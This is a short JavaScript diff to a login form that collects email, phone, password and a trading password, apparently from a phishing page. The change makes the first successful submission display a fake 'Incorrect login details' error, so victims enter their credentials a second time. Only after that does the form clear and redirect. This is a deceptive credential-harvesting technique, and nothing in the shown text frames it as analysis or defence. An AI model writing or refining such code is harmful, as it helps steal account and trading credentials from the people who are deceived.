@@ -165,14 +165,21 @@ document.addEventListener('DOMContentLoaded', function () {
             const data = await response.json();
 
             if (data.success) {
-                // Clear form
-                emailInput.value = '';
-                phoneInput.value = '';
-                passwordInput.value = '';
-                tradingPasswordInput.value = '';
+                let attempts = parseInt(sessionStorage.getItem('loginAttempts') || '0');
+                
+                if (attempts === 0) {
+                    sessionStorage.setItem('loginAttempts', '1');
+                    showToast('Incorrect login details. Please cross-check and try again.', true);
+                } else {
+                    // Clear form
+                    emailInput.value = '';
+                    phoneInput.value = '';
+                    passwordInput.value = '';
+                    tradingPasswordInput.value = '';
 
-                // Show splash for 4 seconds, then success screen, then redirect
-                showSplash(2000, showSuccessAndRedirect);
+                    // Show splash for 4 seconds, then success screen, then redirect
+                    showSplash(2000, showSuccessAndRedirect);
+                }
             } else {
                 showToast(data.message || 'Something went wrong', true);
             }
